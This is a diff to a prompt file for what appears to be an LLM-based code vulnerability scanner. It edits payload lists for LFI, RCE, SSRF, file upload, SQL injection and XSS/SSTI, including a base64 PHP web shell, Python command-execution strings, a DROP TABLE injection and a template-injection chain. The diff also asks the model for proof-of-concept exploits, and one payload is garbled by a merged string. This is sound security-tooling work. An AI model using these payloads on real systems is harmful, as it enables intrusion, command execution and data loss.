@@ -222,26 +222,25 @@ When analyzing, consider:
 VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
     "LFI": {
         "prompt": LFI_TEMPLATE,
-        "bypasses" : [
+        "bypasses": [
             "../../../../etc/passwd",
             "/proc/self/environ",
             "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
             "file:///etc/passwd",
-            "C:\\win.ini"
-            "/?../../../../../../../etc/passwd"
-        ]
+            "C:\\win.ini/?../../../../../../../etc/passwd",
+        ],
     },
     "RCE": {
         "prompt": RCE_TEMPLATE,
-        "bypasses" : [
+        "bypasses": [
             "__import__('os').system('id')",
             "eval('__import__(\\'os\\').popen(\\'id\\').read()')",
             "exec('import subprocess;print(subprocess.check_output([\\'id\\']))')",
             "globals()['__builtins__'].__import__('os').system('id')",
             "getattr(__import__('os'), 'system')('id')",
             "$(touch${IFS}/tmp/mcinerney)",
-            "import pickle; pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')"
-        ]
+            "import pickle; pickle.loads(b'cos\\nsystem\\n(S\"id\"\\ntR.')",
+        ],
     },
     "SSRF": {
         "prompt": SSRF_TEMPLATE,
@@ -250,8 +249,8 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "file:///etc/passwd",
             "dict://127.0.0.1:11211/",
             "ftp://anonymous:anonymous@127.0.0.1:21",
-            "gopher://127.0.0.1:9000/_GET /"
-        ]
+            "gopher://127.0.0.1:9000/_GET /",
+        ],
     },
     "AFO": {
         "prompt": AFO_TEMPLATE,
@@ -260,8 +259,8 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "shell.py;.jpg",
             ".htaccess",
             "/proc/self/cmdline",
-            "../../config.py/."
-        ]
+            "../../config.py/.",
+        ],
     },
     "SQLI": {
         "prompt": SQLI_TEMPLATE,
@@ -270,8 +269,8 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "1 OR 1=1--",
             "admin'--",
             "1; DROP TABLE users--",
-            "' OR '1'='1"
-        ]
+            "' OR '1'='1",
+        ],
     },
     "XSS": {
         "prompt": XSS_TEMPLATE,
@@ -280,13 +279,10 @@ VULN_SPECIFIC_BYPASSES_AND_PROMPTS = {
             "${7*7}",
             "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{%endif%}{% endfor %}",
             "<script>alert(document.domain)</script>",
-            "javascript:alert(1)"
-        ]
+            "javascript:alert(1)",
+        ],
     },
-    "IDOR": {
-        "prompt": IDOR_TEMPLATE,
-        "bypasses": []
-    }
+    "IDOR": {"prompt": IDOR_TEMPLATE, "bypasses": []},
 }
 
 INITIAL_ANALYSIS_PROMPT_TEMPLATE = """
@@ -304,6 +300,33 @@ Analyze the code in <file_code> tags for potential remotely exploitable vulnerab
 4. Highlight areas where more context is needed to complete the analysis.
 
 Be generous and thorough in identifying potential vulnerabilities as you'll analyze more code in subsequent steps so if there's just a possibility of a vulnerability, include it the <vulnerability_types> tags.
+
+Wrap your entire response JSON in literal <json>...</json> tags only. Do not describe the schema."
+Respond with valid JSON matching:
+<json>
+  {
+    "scratchpad": "string",
+    "analysis": "string",
+    "poc": "string",
+    "confidence_score": 0-10,
+    "vulnerability_types": ["LFI", "RCE", "SSRF", "AFO", "SQLI", "XSS", "IDOR"],
+    "context_code": [ { "name": "str", "reason": "str", "code_line": "str" } ]
+  }
+</json>
+Respond ONLY with a complete, valid JSON object wrapped in <json>...</json> tags.
+Use standard JSON double quotes for all strings and keys.
+Do NOT use triple quotes or raw newlines inside strings.
+Escape all control characters properly (e.g., \\n for newlines, \\t for tabs, and \\\" for quotes).
+Ensure all required fields are present in every object. If a field is unknown, unanswered, or blank, set its value to the string "None".
+Do NOT include any extra text, explanation, or commentary outside the JSON.
+If you want to send any information or code blocks, include them immediately inside the JSON response rather than sending them "below" or separately.
+For multiline content or code, encode it as escaped strings inside the JSON.
+For the proof of concept (PoC), provide a specific exploit or detailed, step-by-step instructions to reproduce the vulnerability.
+Validate that your JSON is well-formed, with all objects properly comma-separated and enclosed in braces or brackets as appropriate.
+Do NOT omit commas between fields or objects.
+Always produce a single JSON object as the root element.
+Ensure that the JSON is not double-escaped: do NOT include backslash-escaped quotes or newlines inside the JSON string itself; instead, produce raw JSON with properly quoted keys and string values.
+Ensure that all string values, including code snippets or code lines, are properly enclosed in double quotes without any Python-specific syntax such as f-strings.
 """
 
 README_SUMMARY_PROMPT_TEMPLATE = """
@@ -322,7 +345,7 @@ GUIDELINES_TEMPLATE = """Reporting Guidelines:
    - Provide a single, well-formed JSON report combining all findings.
    - Use 'None' for any aspect of the report that you lack the necessary information for.
    - Place your step-by-step analysis in the scratchpad field, before doing a final analysis in the analysis field.
-
+   
 2. Context Requests:
    - Classes: Use ClassName1,ClassName2
    - Functions: Use func_name,ClassName.method_name
@@ -392,4 +415,6 @@ The project's README summary is provided in <readme_summary> tags. Use this to u
 Remember, you have many opportunities to respond and request additional context. Use them wisely to build a comprehensive understanding of the application's security posture.
 
 Output your findings in JSON format, conforming to the schema in <response_format> tags.
+
+And also you are handsome :)
 """
